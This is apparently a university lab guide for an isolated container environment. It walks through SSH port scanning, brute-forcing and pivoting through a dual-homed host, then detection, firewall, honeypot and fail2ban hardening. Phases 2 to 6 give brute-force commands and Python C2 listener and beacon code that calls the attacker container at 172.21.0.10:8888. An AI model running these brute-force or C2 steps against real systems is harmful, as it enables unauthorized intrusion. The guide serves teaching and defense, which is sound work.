# SSH Brute-Force & Botnet Lab — Step-by-Step Guide
**FEUP SSR — Cybersecurity Research Lab**  
*Educational use only — all traffic runs inside isolated Docker networks*

---

## Before you start — understanding what you have

Your lab has **6 containers** running on **2 isolated networks**:

```
attack_net (172.21.0.0/24)          internal_net (10.10.0.0/24)
─────────────────────────           ────────────────────────────
attacker   172.21.0.10              victim3    10.10.0.10
victim1    172.21.0.20  ←── also on internal_net as 10.10.0.20
victim2    172.21.0.21              honeypot   10.10.0.50
monitor    172.21.0.100             monitor    10.10.0.100
```

> **Why two networks?**
> This simulates a real enterprise — an external-facing network (attack_net)
> and an internal protected network (internal_net). The attacker cannot reach
> internal_net directly. They must first compromise victim1, then use it as a
> **pivot** to reach the internal network.

> **Why victim1 has two IPs?**
> victim1 is **dual-homed** — connected to both networks making it the pivot
> point. Once compromised, it becomes the attacker's bridge into the internal
> network. In real enterprise breaches, dual-homed machines are the most
> dangerous targets.

### Lab credentials (intentionally weak)

| Container | Username | Password |
|---|---|---|
| victim1, victim2 | labuser | password123 |
| victim1, victim2 | admin | admin |
| victim1, victim2 | deploy | deploy123 |
| victim1, victim2 | root | toor |
| victim3, honeypot | labuser | internal123 |
| victim3, honeypot | svcaccount | service1 |
| victim3, honeypot | root | rootpass |

---

## Phase 0 — Start the lab

```bash
cd ~/Documents/ssh-botnet-lab
chmod +x setup.sh
./setup.sh
```

The setup script handles everything automatically. When it finishes run:

```bash
podman ps
```

All 6 containers should show status `Up`. If any show `Exited`:

```bash
podman rm -f attacker victim1 victim2 victim3 honeypot monitor
podman compose up -d --build
```

> **Note — Docker vs Podman:**
> Kali uses Podman rootless by default. This means containers run without
> host root privileges. Some features behave differently:
> - Raw sockets blocked → use Python scanner instead of default nmap
> - No systemd → rsyslog replaced by sshd -e for logging
> - CAP_SYS_CHROOT needed for sshd → solved by not setting cap_drop
> - iptables needs CAP_NET_ADMIN → added to victim containers

---

## Phase 1 — Reconnaissance (scanning)

**Goal:** Discover what machines exist on the network and what ports are open.

Open a shell on the attacker:

```bash
podman exec -it attacker bash
```

Run the port scanner and save results:

```bash
python3 /lab/simulator.py scan --network 172.21.0. 2>&1 | \
  grep "OPEN" | awk '{print $5}' > /tmp/open_ports.txt
cat /tmp/open_ports.txt
```

Expected output:
```
172.21.0.20:22
172.21.0.21:22
```

Probe a port manually with netcat:

```bash
nc -zv 172.21.0.20 22
nc -zv 172.21.0.21 22
```

> **What is port scanning?**
> Before attacking, a hacker maps the network to find running services.
> Port 22 open = SSH server = potential brute-force target.
>
> **Why not use nmap directly?**
> Podman rootless blocks raw sockets (CAP_NET_RAW). The Python simulator
> uses normal TCP connect which works without special privileges.

---

## Phase 2 — SSH Brute-Force Attack

**Goal:** Gain access to victim1 by systematically trying credentials.

Open **2 terminals**:

**Terminal 1** — watch victim1 log in real time:

```bash
podman exec -it victim1 tail -f /var/log/auth.log
```

**Terminal 2** — run the brute-force:

```bash
podman exec -it attacker python3 /lab/simulator.py bruteforce \
  --target 172.21.0.20 --delay 1.0 --max-attempts 150
```

You will see Terminal 1 flood with `Failed password` lines. When it finds
valid credentials you see `Accepted password` in the log and
`CREDENTIAL FOUND` in Terminal 2.

> **Reading the log:**
> ```
> Failed password for admin from 172.21.0.10 port 39116 ssh2
> Connection closed by authenticating user admin 172.21.0.10 port 39116 [preauth]
> ```
> - `admin` — username tried
> - `172.21.0.10` — attacker IP, same every line (primary detection signal)
> - `port 39116` — source port, changes per attempt (new TCP connection each try)
> - `Connection closed [preauth]` — normal: sshd closed the connection after
>   the failed attempt. This is expected output, not an error.

To simulate a botnet attacking multiple machines simultaneously, open a
**third terminal** and attack victim2 at the same time:

```bash
podman exec -it attacker python3 /lab/simulator.py bruteforce \
  --target 172.21.0.21 --delay 1.0 --max-attempts 150
```

---

## Phase 3 — Manual SSH Login (verifying access)

After the brute-force finds credentials, verify you can log in:

```bash
podman exec -it attacker ssh -o StrictHostKeyChecking=no admin@172.21.0.20
# password: admin
```

Once inside victim1:

```bash
whoami
hostname
ip addr show    # shows TWO interfaces — eth0 and eth1
ip route show
```

> **What `ip addr show` reveals:**
> You will see victim1 has two network interfaces:
> - eth0: 172.21.0.20 — attack_net (where you came from)
> - eth1: 10.10.0.20  — internal_net (the new network to explore)
>
> This is the pivot point. From here you can reach 10.10.0.x machines
> that are completely invisible from outside.

Exit back:

```bash
exit
```

---

## Phase 4 — Lateral Movement (pivoting to Network B)

**Goal:** Use compromised victim1 to reach machines in internal_net.

> **Important:** The simulator MUST run FROM victim1, not the attacker.
> The attacker has no route to 10.10.0.x. Running lateral from the attacker
> gives `[Errno 101] Network is unreachable` — correct behaviour.

### Step 1 — Prepare victim1 to run the simulator

```bash
# Copy Python packages from attacker to victim1 (victims have no internet)
podman exec attacker bash -c \
  "tar czf /tmp/pkgs.tar.gz /usr/lib/python3/dist-packages/ 2>/dev/null"
podman cp attacker:/tmp/pkgs.tar.gz /tmp/pkgs.tar.gz
podman cp /tmp/pkgs.tar.gz victim1:/tmp/pkgs.tar.gz
podman exec victim1 bash -c "cd / && tar xzf /tmp/pkgs.tar.gz 2>/dev/null"

podman exec attacker bash -c \
  "tar czf /tmp/libs.tar.gz \
    /usr/lib/x86_64-linux-gnu/libsodium* \
    /usr/lib/x86_64-linux-gnu/libcrypto* \
    /usr/lib/x86_64-linux-gnu/libssl* 2>/dev/null"
podman cp attacker:/tmp/libs.tar.gz /tmp/libs.tar.gz
podman cp /tmp/libs.tar.gz victim1:/tmp/libs.tar.gz
podman exec victim1 bash -c "cd / && tar xzf /tmp/libs.tar.gz 2>/dev/null"
podman exec victim1 ldconfig 2>/dev/null

# Verify
podman exec victim1 python3 -c "import paramiko; print('paramiko ok')"
```

```bash
# Copy simulator and add internal network passwords
podman cp attacker:/lab/simulator.py /tmp/sim.py
python3 -c "
c = open('/tmp/sim.py').read()
if 'internal123' not in c:
    c = c.replace('\"pass1234\"', '\"pass1234\", \"internal123\", \"service1\"')
    open('/tmp/sim.py','w').write(c)
"
podman cp /tmp/sim.py victim1:/tmp/sim.py
```

> **Note:** The setup.sh script does all of the above automatically.
> Only run these steps if you need to redo them manually.

### Step 2 — Run the lateral brute-force FROM victim1

**Terminal 1** — watch victim3:

```bash
podman exec -it victim3 tail -f /var/log/auth.log
```

**Terminal 2** — run FROM victim1 (the pivot):

```bash
podman exec -it victim1 python3 /tmp/sim.py bruteforce \
  --target 10.10.0.10 --delay 1.0 --max-attempts 120
```

> **What the log shows on victim3:**
> ```
> Failed password for labuser from 10.10.0.20 port 41234 ssh2
> Accepted password for labuser from 10.10.0.20 port 41236 ssh2
> ```
> Source IP is `10.10.0.20` — victim1's internal address, NOT the real
> attacker `172.21.0.10`. The firewall protecting internal_net sees only
> a legitimate internal connection. This is what LATERAL-001 catches.

### Step 3 — Manual pivot

```bash
podman exec -it victim1 bash
ssh -o StrictHostKeyChecking=no labuser@10.10.0.10
# password: internal123

whoami      # labuser
hostname    # victim3
ip addr show

exit
exit
```

Full chain: **attacker → victim1 → victim3**

---

## Phase 5 — C2 Beaconing

**Goal:** Simulate infected machines phoning home to the C2 server.

> **Start the listener FIRST. If you run beacons before the listener is
> ready you get `[Errno 111] Connection refused`.**
>
> **Network routing:**
> - victim1 → attacker: direct (both on attack_net) ✓
> - victim3 → attacker: NO ROUTE (victim3 only on internal_net)
> - victim3 → victim1: works (both on internal_net) ✓

### Step 1 — Start C2 listener on the attacker

```bash
podman exec -it attacker python3 -c "
import socket, json
srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(('0.0.0.0', 8888))
srv.listen(10)
print('[C2] Listener ready on port 8888')
while True:
    conn, addr = srv.accept()
    data = conn.recv(1024).decode(errors='ignore')
    print(f'[C2] BEACON from {addr[0]}: {data[:120]}')
    conn.send(b'HTTP/1.1 200 OK\r\n\r\nOK')
    conn.close()
"
```

### Step 2 — Send beacons from victim1 (another terminal)

```bash
podman exec -it victim1 python3 -c "
import socket, time, json
from datetime import datetime
for i in range(5):
    try:
        payload = json.dumps({'bot_id':'victim1','type':'HEARTBEAT','seq':i+1,
                              'ts':datetime.utcnow().isoformat()}).encode()
        s = socket.create_connection(('172.21.0.10', 8888), timeout=3)
        s.send(b'POST /beacon HTTP/1.1\r\nContent-Length: '
               + str(len(payload)).encode() + b'\r\n\r\n' + payload)
        s.close()
        print(f'Beacon {i+1}/5 sent')
    except Exception as e:
        print(f'Beacon {i+1} failed: {e}')
    time.sleep(10)
"
```

### Step 3 — Start relay listener on victim1, then beacon from victim3

victim3 cannot reach the attacker directly — it beacons to victim1 instead.

**Terminal — relay listener on victim1:**

```bash
podman exec -it victim1 python3 -c "
import socket
srv = socket.socket()
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(('0.0.0.0', 8888)); srv.listen(10)
print('[C2-relay] Ready on victim1:8888')
while True:
    c, a = srv.accept()
    print(f'[C2-relay] BEACON from {a[0]}: {c.recv(1024).decode()[:80]}')
    c.send(b'HTTP/1.1 200 OK\r\n\r\n'); c.close()
"
```

**Terminal — beacon from victim3:**

```bash
podman exec -it victim3 python3 -c "
import socket, time, json
from datetime import datetime
for i in range(5):
    try:
        payload = json.dumps({'bot_id':'victim3','type':'HEARTBEAT',
                              'seq':i+1}).encode()
        s = socket.create_connection(('10.10.0.20', 8888), timeout=3)
        s.send(b'POST /beacon HTTP/1.1\r\nContent-Length: '
               + str(len(payload)).encode() + b'\r\n\r\n' + payload)
        s.close()
        print(f'Beacon {i+1}/5 sent from victim3')
    except Exception as e:
        print(f'Beacon {i+1} failed: {e}')
    time.sleep(10)
"
```

---

## Phase 6 — Full Botnet Scenario

**Terminal 1 — watch logs:**
```bash
podman exec -it victim1 tail -f /var/log/auth.log
```

**Terminal 2 — C2 listener:**
```bash
podman exec -it attacker python3 -c "
import socket
srv = socket.socket(); srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(('0.0.0.0', 8888)); srv.listen(10); print('[C2] Ready')
while True:
    c, a = srv.accept()
    print(f'[C2] BEACON from {a[0]}')
    c.recv(1024); c.send(b'HTTP/1.1 200 OK\r\n\r\n'); c.close()
"
```

**Terminal 3 — full scenario:**
```bash
podman exec -it attacker python3 /lab/simulator.py botnet
```

**Terminal 4 — detection after:**
```bash
podman exec victim1 cat /var/log/auth.log > /tmp/a.log
podman exec victim3 cat /var/log/auth.log >> /tmp/a.log
podman cp /tmp/a.log monitor:/var/log/lab/auth.log
podman exec -it monitor python3 /lab/monitor/analyzer.py --report
```

---

## Phase 7 — Detection and Analysis

Collect logs then run the analyzer:

```bash
podman exec victim1 cat /var/log/auth.log > /tmp/a.log
podman exec victim2 cat /var/log/auth.log >> /tmp/a.log
podman exec victim3 cat /var/log/auth.log >> /tmp/a.log
podman cp /tmp/a.log monitor:/var/log/lab/auth.log

podman exec -it monitor python3 /lab/monitor/analyzer.py
podman exec -it monitor python3 /lab/monitor/analyzer.py --report
podman exec -it monitor python3 /lab/monitor/analyzer.py --rules
```

> **Detection rules:**
>
> **SSH-001 — Brute force:** ≥5 failed logins from same source IP.
>
> **SSH-002 — Password spray:** One IP targeting many different usernames.
> Stays under per-account lockout thresholds.
>
> **SSH-003 — Successful brute-force:** Failures + success from same IP.
> The smoking gun — attacker is inside.
>
> **LATERAL-001 — East-west SSH:** SSH where source IP is also internal.
> Internal-to-internal SSH is almost always lateral movement.
>
> **HONEYPOT-001:** Any connection to 10.10.0.50. Zero false positives.

---

## Phase 8 — Firewall Demo

Open a shell on victim1:

```bash
podman exec -it victim1 bash
```

**Step 1 — No firewall:**

```bash
bash /lab/firewall_setup.sh weak
iptables -L INPUT -n -v
```

Run brute-force from another terminal — succeeds immediately.

**Step 2 — Rate limiting and logging:**

```bash
bash /lab/firewall_setup.sh moderate
```

Run brute-force again — still succeeds but every attempt is now logged.
Check the firewall log (run inside victim1 shell):

```bash
dmesg | grep "BRUTEFORCE" | tail -10
```

> **Note — run dmesg inside victim1, not on the host.**
> iptables LOG writes to the kernel ring buffer inside the container.
> `podman exec victim1 dmesg` will not show it — you must be inside the
> container shell. Also `SIGHUP; restarting` in auth.log after running
> firewall_setup.sh is normal — sshd reloads its config.

**Step 3 — Full hardening:**

```bash
bash /lab/firewall_setup.sh hardened
iptables -L INPUT -n -v --line-numbers
```

Run brute-force again — completely blocked, attacker gets no response.

> **DROP vs REJECT:**
> `-j DROP` silently discards — attacker times out with no feedback.
> `-j REJECT` sends error back — faster for attacker but confirms host exists.
>
> **After Phase 8:** If you want to continue with other phases, reset the
> firewall back to weak first: `bash /lab/firewall_setup.sh weak`

---

## Phase 9 — Honeypot Investigation

After running lateral movement, check the honeypot:

```bash
podman exec -it honeypot cat /var/log/auth.log
podman exec -it honeypot cat /var/log/lab/honeypot_events.jsonl
```

Trigger the honeypot from victim1:

```bash
podman exec -it victim1 python3 /tmp/sim.py bruteforce \
  --target 10.10.0.50 --delay 1.0 --max-attempts 120
```

> **Zero false positives:** No legitimate user knows 10.10.0.50 exists.
> Any connection is by definition an attacker. The honeypot only triggers
> if lateral movement succeeded — confirming the full attack chain.

---

## Phase 10 — Hardening (defense phase)

> **Important:** If you ran Phase 8 (firewall hardening), reset the firewall
> first or SSH connections will time out:
> ```bash
> podman exec -it victim1 bash
> bash /lab/firewall_setup.sh weak
> exit
> ```

### 1. SSH key authentication

```bash
# Generate key pair on the attacker
podman exec -it attacker ssh-keygen -t ed25519 -f /root/.ssh/lab_key -N ""

# Copy public key to victim1
podman exec -it attacker ssh-copy-id -i /root/.ssh/lab_key.pub admin@172.21.0.20
# password: admin

# Test key login — no password prompt
podman exec -it attacker ssh -i /root/.ssh/lab_key admin@172.21.0.20
```

### 2. Disable password authentication

```bash
podman exec victim1 bash -c "
  sed -i 's/PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
  kill -HUP 1
"
```

### 3. Verify brute-force no longer works

```bash
podman exec -it attacker python3 /lab/simulator.py bruteforce \
  --target 172.21.0.20 --delay 1.0 --max-attempts 150
```

Every attempt fails — no password to guess.

### 4. fail2ban — automated IP banning

> **Note:** fail2ban cannot be installed at runtime because victims have
> `internal: true` (no internet). It must be in the Dockerfile.
> If not installed, add it to `victim/Dockerfile` and rebuild:
>
> ```bash
> # Add fail2ban to victim/Dockerfile apt-get install line, then:
> podman rm -f victim1 victim2
> podman compose up -d --build victim1 victim2
> ```

Once installed, configure it inside victim1:

```bash
podman exec -it victim1 bash

cat > /etc/fail2ban/jail.local << 'EOF'
[sshd]
enabled  = true
port     = 22
filter   = sshd
logpath  = /var/log/auth.log
maxretry = 5
bantime  = 3600
findtime = 600
EOF

service fail2ban start
fail2ban-client status sshd
```

Run brute-force and watch fail2ban auto-ban the attacker:

```bash
# Terminal 2
podman exec -it attacker python3 /lab/simulator.py bruteforce \
  --target 172.21.0.20 --delay 1.0 --max-attempts 150

# Terminal 1 — watch the ban (inside victim1 shell)
fail2ban-client status sshd
```

---

## Quick reference

```bash
# Lab management
podman compose up -d          # start
podman compose down           # stop
podman ps                     # check status

# Open shells
podman exec -it attacker bash
podman exec -it victim1 bash
podman exec -it victim3 bash
podman exec -it monitor bash

# Watch logs
podman exec victim1 tail -f /var/log/auth.log
podman exec victim3 tail -f /var/log/auth.log
podman exec honeypot cat /var/log/auth.log
podman exec honeypot cat /var/log/lab/honeypot_events.jsonl

# Attacker simulations
podman exec -it attacker python3 /lab/simulator.py scan --network 172.21.0.
podman exec -it attacker python3 /lab/simulator.py bruteforce --target 172.21.0.20 --delay 1.0 --max-attempts 150
podman exec -it attacker python3 /lab/simulator.py bruteforce --target 172.21.0.21 --delay 1.0 --max-attempts 150
podman exec -it attacker python3 /lab/simulator.py botnet

# Lateral movement (FROM victim1 only)
podman exec -it victim1 python3 /tmp/sim.py bruteforce --target 10.10.0.10 --delay 1.0 --max-attempts 120
podman exec -it victim1 python3 /tmp/sim.py bruteforce --target 10.10.0.50 --delay 1.0 --max-attempts 120

# Collect logs and detect
podman exec victim1 cat /var/log/auth.log > /tmp/a.log
podman exec victim3 cat /var/log/auth.log >> /tmp/a.log
podman cp /tmp/a.log monitor:/var/log/lab/auth.log
podman exec -it monitor python3 /lab/monitor/analyzer.py --report

# Firewall (inside victim1 bash session)
bash /lab/firewall_setup.sh weak
bash /lab/firewall_setup.sh moderate
bash /lab/firewall_setup.sh hardened
iptables -L INPUT -n -v
dmesg | grep "BRUTEFORCE" | tail -10   # run inside victim1 shell

# Network
podman exec victim1 ip addr show       # see dual-homed interfaces
podman exec victim1 ip route show
```

---

## Clean up

```bash
podman compose down           # stop, keep images
podman compose down --rmi all # stop and remove everything
podman network prune -f
```

---

## Common errors and fixes

| Error | Cause | Fix |
|---|---|---|
| `Connection reset by peer` | sshd chroot fails | Remove `cap_drop: ALL` from docker-compose.yml — victims need default capabilities |
| `iptables: Permission denied` | Missing CAP_NET_ADMIN | Add `cap_add: [NET_ADMIN]` to victims in docker-compose.yml |
| `Connection timed out` on ssh-copy-id | Hardened firewall still active | Run `bash /lab/firewall_setup.sh weak` inside victim1 first |
| `Unable to locate fail2ban` | `internal: true` blocks internet | Add fail2ban to victim/Dockerfile apt-get install, then rebuild |
| `Beacon failed: Connection refused` | C2 listener not started | Start the listener on attacker BEFORE running beacons |
| `Network is unreachable` to 10.10.x | Running lateral from attacker | Run lateral FROM victim1, not attacker |
| `Analyzer: 0 auth events` | Log format mismatch | Collect logs first: `podman exec victim1 cat /var/log/auth.log > /tmp/a.log` |
| `dmesg` shows nothing | Checking from host | Run `dmesg` inside victim1 shell: `podman exec -it victim1 bash` then `dmesg` |
| `SSHException: Error reading banner` | MaxStartups throttling | Already fixed in entrypoint.sh — MaxStartups 50 baked in |

---

## Lab limitations for the report

| Limitation | Real world equivalent |
|---|---|
| Podman rootless blocks raw sockets | Use dedicated VM for nmap SYN scans |
| fail2ban requires Dockerfile rebuild | Pre-install in production images |
| Plaintext C2 on port 8888 | Real C2 uses HTTPS or DNS tunneling |
| Small wordlist (17 passwords) | Real attacks use rockyou.txt (14M entries) |
| No real persistence mechanisms | Real bots install cron jobs, systemd units |
| victim3 cannot beacon directly to attacker | Real botnets route through the network |
| Single host for all containers | Real lab uses separate physical machines |

---

*FEUP SSR · May 2026 · All traffic isolated · No internet access*
